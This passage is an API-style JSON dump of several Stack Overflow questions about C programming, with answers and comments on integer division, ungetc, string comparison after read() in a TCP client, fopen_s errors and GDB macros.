hex(int(\"0x88555680\",16)//int(\"0x10000\", 16))\n'0x8855'\n</code></pre>\n\n<p>Here is my C code:</p>\n\n<pre><code># include &lt;stdio.h&gt;\n\nint main()  {\n    int a = 0x88555680;\n    int b = 0x10000;\n    int c = a/b;\n    printf(\"a%x, b%x, c%x\\n\", a, b, c);\n}\n</code></pre>\n\n<p>With output: </p>\n\n<pre><code>a88555680, b10000, cffff8856\n</code></pre>\n\n<p>In C, I find <strong>8856</strong>, while with Python, and online calculators, I find <strong>8855</strong></p>\n\n<p><strong>Question:</strong> Why is the C output not 8855? Why is it 8856? Should it not be 8855.something and then truncated towards 0, thus 8855?</p>\n\n<p>I'm very new to C, it might be an obvious error.</p>\n"}, {"tags": ["c", "getchar"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1544674536, "post_id": 53750882, "comment_id": 94362436, "body": "Notice that <code>ungetc</code> can be guaranteed for maximum 1 character... i.e. it can be only used to support one character peek"}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 10254596, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d2a7099f7a1110ad7372a200ab45541?s=128&d=identicon&r=PG&f=1", "display_name": "smackflaad", "link": "https://stackoverflow.com/users/10254596/smackflaad"}, "edited": false, "score": 0, "creation_date": 1544647185, "post_id": 53750942, "comment_id": 94354692, "body": "can you please give me an example?"}], "tags": [], "owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "is_accepted": true, "score": 3, "last_activity_date": 1544647607, "last_edit_date": 1544647607, "creation_date": 1544646949, "answer_id": 53750942, "question_id": 53750882, "link": "https://stackoverflow.com/questions/53750882/c-getchar-re-read-characters/53750942#53750942", "title": "C- getchar() re-read characters?", "body": "<p>Yes, you can use <code>ungetc()</code> to put the character back in the input stream.</p>\n\n<p>Here is an example program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    printf(\"Type something: \");\n    int c = getchar();\n    printf(\"Ok, you typed '%c'. Putting it back...\\n\", c);\n    ungetc(c, stdin);\n    printf(\"Reading it again...\\n\");\n    c = getchar();\n    printf(\"Still '%c'. Putting it back again...\\n\", c);\n    ungetc(c, stdin);\n    printf(\"Reading it again...\\n\");\n    c = getchar();\n    printf(\"Still '%c'!\\n\", c);\n}\n</code></pre>\n\n<p>Running it:</p>\n\n<pre><code>Type something: smackflaad\nOk, you typed 's'. Putting it back...\nReading it again...\nStill 's'. Putting it back again...\nReading it again...\nStill 's'!\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 10254596, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d2a7099f7a1110ad7372a200ab45541?s=128&d=identicon&r=PG&f=1", "display_name": "smackflaad", "link": "https://stackoverflow.com/users/10254596/smackflaad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 123, "favorite_count": 0, "accepted_answer_id": 53750942, "answer_count": 1, "score": 1, "last_activity_date": 1544647607, "creation_date": 1544646684, "question_id": 53750882, "link": "https://stackoverflow.com/questions/53750882/c-getchar-re-read-characters", "title": "C- getchar() re-read characters?", "body": "<p>is there a way that I can read a character with getchar() and read the same character with another getchar()?</p>\n\n<p>for example the user gives 5 and the first getchar() reads 5 and then the second getchar() re-reads the 5.</p>\n\n<p>thanks in advance! </p>\n"}, {"tags": ["c", "linux"], "comments": [{"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1544645480, "post_id": 53750593, "comment_id": 94353964, "body": "and what did you see was happening when you stepped through the code with your debugger?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544645502, "post_id": 53750593, "comment_id": 94353976, "body": "<code>bzero()</code> is deprecated (by POSIX), and was never specified by the C language standard.  You should use <code>memset()</code> instead.  I don&#39;t think that&#39;s the source of your problem, however."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544645572, "post_id": 53750593, "comment_id": 94354013, "body": "Is the return value of <code>read(0, msg, 100);</code> <i>always</i> as expected?"}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 1, "creation_date": 1544645586, "post_id": 53750593, "comment_id": 94354020, "body": "testing the result of read would be a good idea. Adn why are you using such a low level function to read stdin."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1544645615, "post_id": 53750593, "comment_id": 94354030, "body": "What message protocol are you using? Is this connected UDP? UNIX domain? Are you reading from a pipe? I hope this isn&#39;t TCP!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544645645, "post_id": 53750593, "comment_id": 94354046, "body": "<code>strcmp(msg, &quot;&#47;done&quot;)</code> is a problem  when <code>read(0, msg, 100)</code> reads 100 characters as <code>msg</code> is not certainly a <i>string</i>."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544645691, "post_id": 53750593, "comment_id": 94354064, "body": "Given that you are using a low-level I/O function (<code>read</code>) It seems likely that the problem is that you&#39;re getting more than you expect -- a trailing newline, for example.  That would make your input compare unequal to the test string."}, {"owner": {"reputation": 11, "user_id": 10679080, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-iyCxP8TF3nc/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-g2egkiaLe9_-v6vInuxQs9txE7lg/mo/photo.jpg?sz=128", "display_name": "Dragomas", "link": "https://stackoverflow.com/users/10679080/dragomas"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1544646893, "post_id": 53750593, "comment_id": 94354575, "body": "@chux yes it is."}, {"owner": {"reputation": 11, "user_id": 10679080, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-iyCxP8TF3nc/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-g2egkiaLe9_-v6vInuxQs9txE7lg/mo/photo.jpg?sz=128", "display_name": "Dragomas", "link": "https://stackoverflow.com/users/10679080/dragomas"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544646941, "post_id": 53750593, "comment_id": 94354595, "body": "@John Bollinger i was thinking about it but i don&#39;t know how else can i send messages of different sizes and then reuse the variable for a next message also. I will try with memset, and i will come back."}, {"owner": {"reputation": 11, "user_id": 10679080, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-iyCxP8TF3nc/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-g2egkiaLe9_-v6vInuxQs9txE7lg/mo/photo.jpg?sz=128", "display_name": "Dragomas", "link": "https://stackoverflow.com/users/10679080/dragomas"}, "reply_to_user": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1544646959, "post_id": 53750593, "comment_id": 94354603, "body": "@DavidSchwartz it is TCP indeed."}, {"owner": {"reputation": 11, "user_id": 10679080, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-iyCxP8TF3nc/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-g2egkiaLe9_-v6vInuxQs9txE7lg/mo/photo.jpg?sz=128", "display_name": "Dragomas", "link": "https://stackoverflow.com/users/10679080/dragomas"}, "reply_to_user": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 0, "creation_date": 1544647007, "post_id": 53750593, "comment_id": 94354622, "body": "@pm100 i have to use primitives as this is a school project."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544647276, "post_id": 53750593, "comment_id": 94354726, "body": "@Dragomas, I was not suggesting that you should avoid <code>read()</code>, but rather that you should pay more attention to exactly what you have read.  Nevertheless, if you are using an implementation that provides <a href=\"https://linux.die.net/man/3/fdopen\" rel=\"nofollow noreferrer\"><code>fdopen()</code></a>, then it might be that using that to boost yourself into stream I/O instead of raw I/O would make your life easier.  Of course, that supposes that your file descriptor 0 is not already connected to the standard input, so that you could just go straight to using <code>stdin</code>."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1544647946, "post_id": 53750593, "comment_id": 94355027, "body": "@Dragomas Oh, no! TCP is not a message protocol. If you&#39;re going to use TCP to send and receive messages, you have to design (or choose) and implement a message protocol on top of TCP. What if <code>read</code> returns 1?"}], "answers": [{"tags": [], "owner": {"reputation": 1121, "user_id": 2150289, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1256cfbd4bb053bad532320ad570f9a5?s=128&d=identicon&r=PG", "display_name": "maharvey67", "link": "https://stackoverflow.com/users/2150289/maharvey67"}, "is_accepted": false, "score": 0, "last_activity_date": 1544647279, "creation_date": 1544647279, "answer_id": 53751014, "question_id": 53750593, "link": "https://stackoverflow.com/questions/53750593/c-string-comparing/53751014#53751014", "title": "C : String comparing", "body": "<p>read(2) is including the '\\n' at the end of the string. When you use low-level read you get everything. When trying to debug strings, it can be helpful to put quotes in your print statement, like</p>\n\n<pre><code>printf(\"[client]The received message is: '%s'\\n\", msg);\n</code></pre>\n\n<p>as this immediately shows invisible whitespace.</p>\n"}, {"tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": true, "score": 0, "last_activity_date": 1544647512, "creation_date": 1544647512, "answer_id": 53751069, "question_id": 53750593, "link": "https://stackoverflow.com/questions/53750593/c-string-comparing/53751069#53751069", "title": "C : String comparing", "body": "<p>When you read from 0, you're reading from stdin.  If that is a terminal that you are typing into (you don't say), you likely have it set up in normal (canonical) mode, so you'll read a line, which probably includes a newline (\\n) character.  So when you enter <code>/done</code>, the string you get in your msg buffer is <code>\"/done\\n\"</code> which doesn't match <code>\"/done\"</code>...</p>\n"}, {"tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 0, "last_activity_date": 1544648083, "creation_date": 1544648083, "answer_id": 53751194, "question_id": 53750593, "link": "https://stackoverflow.com/questions/53750593/c-string-comparing/53751194#53751194", "title": "C : String comparing", "body": "<p>TCP is not a message protocol. It does <em>not</em> glue bytes together into messages. If you want to use TCP to send and receive messages, you'll need to implement functions that send and receive messages.</p>\n\n<p>I must strongly caution you not to fail into the trap of thinking that changing your code from happening not to work when you tried it to happening to work when you try it means that you've fixed it. Your code fails if <code>read</code> returns 1. You need to implement a sensible function to receive a message or your code will only be working by luck, and I can tell you from painful experience that one day your luck will run out.</p>\n"}], "owner": {"reputation": 11, "user_id": 10679080, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-iyCxP8TF3nc/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-g2egkiaLe9_-v6vInuxQs9txE7lg/mo/photo.jpg?sz=128", "display_name": "Dragomas", "link": "https://stackoverflow.com/users/10679080/dragomas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 53751069, "answer_count": 3, "score": -2, "last_activity_date": 1544648083, "creation_date": 1544645221, "question_id": 53750593, "link": "https://stackoverflow.com/questions/53750593/c-string-comparing", "title": "C : String comparing", "body": "<pre><code>bool done;\ndone = false;\nwhile (!done) {\n    /* read the message */\n    bzero(msg, 100);\n    printf(\"[client]Type something: \");\n    fflush(stdout);\n    read(0, msg, 100);\n    if (strcmp(msg, \"/done\") == 0) {\n        done = true;\n        /* sending the message to the server */\n        if (write(sd, msg, 100) &lt;= 0) {\n            perror(\"[client]Error sending the message to the server.\\n\");\n            return errno;\n        }\n    } else {\n        /* sending the message to the server */\n        if (write(sd, msg, 100) &lt;= 0) {\n            perror(\"[client]Error sending the message to the server.\\n\");\n            return errno;\n\n        /* reading the answer given by the server*/\n        if (read(sd, msg, 100) &lt; 0) {\n            perror(\"[client]read() error from server.\\n\");\n            return errno;\n        }\n        /* printing the received message */\n        printf(\"[client]The received message is: %s\\n\", msg);\n    }\n}\n</code></pre>\n\n<p>Here's the code that i have problem with. So i want to send messages to the server until I send the message \"/done\", the code works, I send messages continuously but even when i type and send \"/done\" the process doesn't end.</p>\n\n<p>I think there's a problem with the bzero function that \"clears\" the msg or maybe i don't understand it so good.</p>\n\n<p>I also tried to wrote my own function to check if two strings are the same, but no effect also.</p>\n\n<p>So how should i write the condition or \"clear\" the msg so i can send messages continuously and after i send \"/done\" the execution ends?</p>\n\n<p>P.S. the msg is declared earlier in the code as char msg[100];</p>\n"}, {"tags": ["c", "visual-studio"], "comments": [{"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 2, "creation_date": 1544644102, "post_id": 53750315, "comment_id": 94353392, "body": "<code>fopen_s</code> returns an <code>errno_t</code> and you are assigning it to <code>cfPtr</code>, which is type <code>FILE *</code>. Read the document describing <a href=\"https://docs.microsoft.com/en-us/previous-versions/z5hh6ee9(v%3Dvs.140)\" rel=\"nofollow noreferrer\"><code>fopen_s</code></a>."}, {"owner": {"reputation": 519, "user_id": 6191539, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzjJY.jpg?s=128&g=1", "display_name": "Catsunami", "link": "https://stackoverflow.com/users/6191539/catsunami"}, "edited": false, "score": 1, "creation_date": 1544644285, "post_id": 53750315, "comment_id": 94353479, "body": "-1. This question should be closed, the problem is with reading documentation and it is unlikely to help someone in the future."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1544644504, "post_id": 53750315, "comment_id": 94353571, "body": "Please note that Microsoft&#39;s <a href=\"https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/scanf-s-scanf-s-l-wscanf-s-wscanf-s-l?view=vs-2017\" rel=\"nofollow noreferrer\"><code>scanf_s</code></a> requires a <b>length argument</b> for <code>%s</code> and <code>%c</code> format spec types, and the compiler does issue a warning. Also please see <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why is <code>while ( !feof (file) )</code> always wrong?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 10782694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/80df41638207b76086407c530ad39bb7?s=128&d=identicon&r=PG&f=1", "display_name": "Jvesche20", "link": "https://stackoverflow.com/users/10782694/jvesche20"}, "edited": false, "score": 0, "creation_date": 1544658220, "post_id": 53750366, "comment_id": 94358969, "body": "Thanks, it works but do you have any idea why this program isn&#39;t creating a file now?"}], "tags": [], "owner": {"reputation": 206, "user_id": 10782273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d399d770b2a0f874852b8f08fd41930?s=128&d=identicon&r=PG&f=1", "display_name": "Rekamanon", "link": "https://stackoverflow.com/users/10782273/rekamanon"}, "is_accepted": false, "score": 2, "last_activity_date": 1544644139, "creation_date": 1544644139, "answer_id": 53750366, "question_id": 53750315, "link": "https://stackoverflow.com/questions/53750315/how-do-i-fix-this-error-cant-write-another-file-in-c/53750366#53750366", "title": "How do I fix this error, cant write another file in C", "body": "<p>You can't assign fopen_s() to cfPtr because they are of different types. Instead try this:</p>\n\n<pre><code>FILE *cfPtr;\nerrno_t err;\n\nerr = fopen_s(&amp;cfPtr,\"client.txt\", \"w\");\nif ( err == NULL) {\n    puts(\"File could not be opened\");\n}\nelse {\nputs(\"Enter the account, name, and balance.\");\nputs(\"Enter E0F to end input.\");\nprintf(\"%s\", \"? \");\n\nunsigned int account;\nchar name[30];\ndouble balance;\n\nscanf_s(\"%d%29s%lf\", &amp;account, name, &amp;balance);\n\nwhile (!feof(stdin)) {\n    fprintf(cfPtr, \"%d %s %.2f\\n\", account, name, balance);\n    printf(\"%s\", \"? \");\n    scanf_s(\"%d%29s%lf\", &amp;account, name, &amp;balance);\n}\nfclose(cfPtr);\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10782694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/80df41638207b76086407c530ad39bb7?s=128&d=identicon&r=PG&f=1", "display_name": "Jvesche20", "link": "https://stackoverflow.com/users/10782694/jvesche20"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 216, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1544644139, "creation_date": 1544643909, "question_id": 53750315, "link": "https://stackoverflow.com/questions/53750315/how-do-i-fix-this-error-cant-write-another-file-in-c", "title": "How do I fix this error, cant write another file in C", "body": "<p>So I'm trying to get this code to work and it's giving me an error. I've tried to search it up but couldn't find anything to get it to work. </p>\n\n<p>Error (active)  E0513   a value of type \"errno_t\" cannot be assigned to an entity of type \"FILE *\"\nI get that error and this one</p>\n\n<p>Error   C2440   '=': cannot convert from 'errno_t' to 'FILE *'  ch11Program </p>\n\n<p>Any ideas what to do here?</p>\n\n<pre><code>FILE *cfPtr;\n\ncfPtr = fopen_s(&amp;cfPtr,\"client.txt\", \"w\");\nif ( cfPtr == NULL) {\n    puts(\"File could not be opened\");\n}\nelse {\n    puts(\"Enter the account, name, and balance.\");\n    puts(\"Enter E0F to end input.\");\n    printf(\"%s\", \"? \");\n\n    unsigned int account;\n    char name[30];\n    double balance;\n\n    scanf_s(\"%d%29s%lf\", &amp;account, name, &amp;balance);\n\n    while (!feof(stdin)) {\n        fprintf(cfPtr, \"%d %s %.2f\\n\", account, name, balance);\n        printf(\"%s\", \"? \");\n        scanf_s(\"%d%29s%lf\", &amp;account, name, &amp;balance);\n    }\n    fclose(cfPtr);\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "algorithm"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544643651, "post_id": 53750160, "comment_id": 94353172, "body": "Aside; <code>rand()%40</code> generates 40 different values.  Clarify &quot;between -10 and 30&quot;,  Is that <code>[-10...30]</code> (41 different values) or what else?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1544643781, "post_id": 53750160, "comment_id": 94353237, "body": "Sorting not needed here."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1544643987, "post_id": 53750160, "comment_id": 94353333, "body": "As far as I can tell, there is no need here to sort.  In fact, what you have described in words is reasonably close to being directly implementable in code.  I would describe it as finding the maximal sum of a contiguous run of positive integers."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1544644805, "post_id": 53750160, "comment_id": 94353688, "body": "This makes no sense, why are you skipping values that are less than 66? They all less than 66 since the maximum value is 30 (or actually 29 in your code). Also why 28+28+10? There is only one value 28 in the list. Summing positive values and finding the largest value makes sense, but your &quot;For example...&quot; is nonsense. Either way, no sorting required. Greater clarity in your example (if an example is even needed) certainly required."}, {"owner": {"reputation": 11349, "user_id": 6487675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe04c577bacde4d7dd2cdd8f495df696?s=128&d=identicon&r=PG&f=1", "display_name": "dWinder", "link": "https://stackoverflow.com/users/6487675/dwinder"}, "edited": false, "score": 0, "creation_date": 1544682348, "post_id": 53750160, "comment_id": 94364534, "body": "@EdgarasSarap Did my post answer you?"}], "answers": [{"comments": [{"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1544644710, "post_id": 53750400, "comment_id": 94353646, "body": "This does &quot;<i>i need to add integer that are positive and find the highest value of them. _&quot;, which may be what is required, but that is not what the (frankly bizarre and unclear)  &quot;_For example...</i>&quot; does."}, {"owner": {"reputation": 1, "user_id": 10740478, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12b0fb2f82d133882bc3c35b9db4e974?s=128&d=identicon&r=PG&f=1", "display_name": "EdgarasSarap", "link": "https://stackoverflow.com/users/10740478/edgarassarap"}, "edited": false, "score": 0, "creation_date": 1544858956, "post_id": 53750400, "comment_id": 94431966, "body": "Thank you David for your help, it worked."}], "tags": [], "owner": {"reputation": 11349, "user_id": 6487675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe04c577bacde4d7dd2cdd8f495df696?s=128&d=identicon&r=PG&f=1", "display_name": "dWinder", "link": "https://stackoverflow.com/users/6487675/dwinder"}, "is_accepted": true, "score": 1, "last_activity_date": 1544644326, "creation_date": 1544644326, "answer_id": 53750400, "question_id": 53750160, "link": "https://stackoverflow.com/questions/53750160/find-the-maximum-sum-of-positive-integers-in-an-array-in-c-language/53750400#53750400", "title": "Find the maximum sum of positive integers in an array in C language", "body": "<p>As the comments said you are in no need of sorting the array. All you need is to find max sum of contiguous positive numbers. You can do that in <code>O(n)</code>.</p>\n\n<p>Consider the following pseudo code:</p>\n\n<pre><code>Max = 0\nSum = 0\nFor i between 0 to n:\n    If arr[i] &lt; 1\n        Sum = 0\n    Else \n        Sum += arr[i]\n    If sum &gt; max\n         Max = sum\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10740478, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12b0fb2f82d133882bc3c35b9db4e974?s=128&d=identicon&r=PG&f=1", "display_name": "EdgarasSarap", "link": "https://stackoverflow.com/users/10740478/edgarassarap"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 210, "favorite_count": 0, "closed_date": 1544689215, "accepted_answer_id": 53750400, "answer_count": 1, "score": -6, "last_activity_date": 1544686011, "creation_date": 1544643244, "last_edit_date": 1544686011, "question_id": 53750160, "link": "https://stackoverflow.com/questions/53750160/find-the-maximum-sum-of-positive-integers-in-an-array-in-c-language", "closed_reason": "Not suitable for this site", "title": "Find the maximum sum of positive integers in an array in C language", "body": "<p>I have a task which is:</p>\n\n<p>Find the maximum sum of positive integers in an array</p>\n\n<p>The task is that I have a random array of 65 integers and values of them is between -10 and 30 and I need to add an integer that is positive and find the highest value of them. </p>\n\n<p>For example i have an array that is [28 28 10 -10 -5 20 -1 2 5 4 -9 2 4 -1]. So I need to add 28+28+10=66, skip negative and go to next positive value that is 20, but it is smaller than 66, so we stick with 66, then we go to next positive value that is 2+5+4=11, but it is also less than 66 so we go on. So far I have a printed array and I don't know how to sort it properly. My code so far is:</p>\n\n<pre><code>int main()\n{\nint array[65];\nint n,i,j;\n\n//Primeral array printing*********\nfor(i=0; i&lt;65; array[i++]=rand()%40-10);\nprintf(\"array:\\n\");\nfor (i=0; i&lt;65; printf(\"%3d \",array[i++]));\nputchar('\\n');\nputchar('\\n')\n}\n</code></pre>\n"}, {"tags": ["c", "gdb", "glibc"], "comments": [{"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 2, "creation_date": 1544642962, "post_id": 53750010, "comment_id": 94352789, "body": "Both <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Offsetof.html\" rel=\"nofollow noreferrer\"><code>__builtin_offsetof()</code></a> and <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Alignment.html\" rel=\"nofollow noreferrer\"><code>__alignof__</code></a> are provided by GCC."}, {"owner": {"reputation": 139, "user_id": 5719061, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000175604274/picture?type=large", "display_name": "Trung Quan Vo", "link": "https://stackoverflow.com/users/5719061/trung-quan-vo"}, "reply_to_user": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1544643790, "post_id": 53750010, "comment_id": 94353239, "body": "So, I&#39;ll have to rebuild gcc to get those symbols, last time it takes more than 1 hours."}], "answers": [{"comments": [{"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 4, "creation_date": 1544646658, "post_id": 53750732, "comment_id": 94354464, "body": "Some background info: Very recently (September 2018) released GDB version 8.2 and later do understand <code>_Alignof</code>, which is equivalent to <code>__alignof__</code>; then, <code>macro define __alignof__ _Alignof</code> suffices in GDB.  GDB already supports <code>sizeof</code>. <code>__builtin_offsetof(type, member)</code> can be defined in GDB as <code>macro define __builtin_offsetof(t, f) ((unsigned long)(&amp;((t *)0)-&gt;f)))</code>."}, {"owner": {"reputation": 139, "user_id": 5719061, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000175604274/picture?type=large", "display_name": "Trung Quan Vo", "link": "https://stackoverflow.com/users/5719061/trung-quan-vo"}, "edited": false, "score": 